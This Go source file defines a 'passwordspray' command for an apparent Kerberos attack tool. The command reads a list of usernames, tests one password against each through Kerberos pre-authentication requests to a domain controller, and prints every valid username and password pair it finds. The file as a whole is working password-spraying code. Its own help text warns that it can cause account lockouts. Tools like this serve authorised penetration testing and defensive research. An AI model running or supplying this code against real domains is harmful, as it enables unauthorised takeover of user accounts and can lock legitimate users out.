package cmd

import (
	"bufio"
	"fmt"
	"os"
	"time"

	"github.com/spf13/cobra"
)

var usernameList string
var password string

var passwordSprayCmd = &cobra.Command{
	Use:   "passwordspray [flags] <username_wordlist> <password>",
	Short: "Test a single password against a list of users",
	Long: `Will perform a password spray attack against a list of users using Kerberos Pre-Authentication by requesting a TGT from the KDC.
If no domain controller is specified, the tool will attempt to look one up via DNS SRV records.
A full domain is required. This domain will be capitalized and used as the Kerberos realm when attempting the bruteforce.
Succesful logins will be displayed on stdout.
WARNING: use with caution - failed Kerberos pre-auth can cause account lockouts`,
	Args:   cobra.ExactArgs(2),
	PreRun: setupSession,
	Run:    passwordSpray,
}

func init() {
	rootCmd.AddCommand(passwordSprayCmd)
}

func passwordSpray(cmd *cobra.Command, args []string) {
	usernamelist := args[0]
	password := args[1]
	fmt.Printf("mode: %v\n", KSession.SafeMode)
	Log.Info("Using KDC(s):")
	for _, v := range KSession.Kdcs {
		Log.Infof("\t%s\n", v)
	}

	file, err := os.Open(usernamelist)
	if err != nil {
		Log.Fatal(err)
	}
	defer file.Close()

	scanner := bufio.NewScanner(file)

	var username string
	count, success := 0, 0
	start := time.Now()
	for scanner.Scan() {
		count++
		username = scanner.Text()
		login := fmt.Sprintf("%v@%v", username, Domain)
		if ok, err := KSession.TestLogin(username, password); ok {
			success++
			Log.Noticef("[+] VALID LOGIN:\t %s : %s", login, password)
		} else {
			// This is to determine if the error is "okay" or if we should abort everything
			ok, errorString := KSession.HandleKerbError(err)
			if !ok {
				Log.Errorf("[!] %v - %v", login, errorString)
				return
			}
			Log.Debugf("[!] %v - %v", login, errorString)
		}
	}

	Log.Infof("Done! Tested %d logins (%d successes) in %.3f seconds", count, success, time.Since(start).Seconds())

	if err := scanner.Err(); err != nil {
		Log.Fatal(err)
	}

}
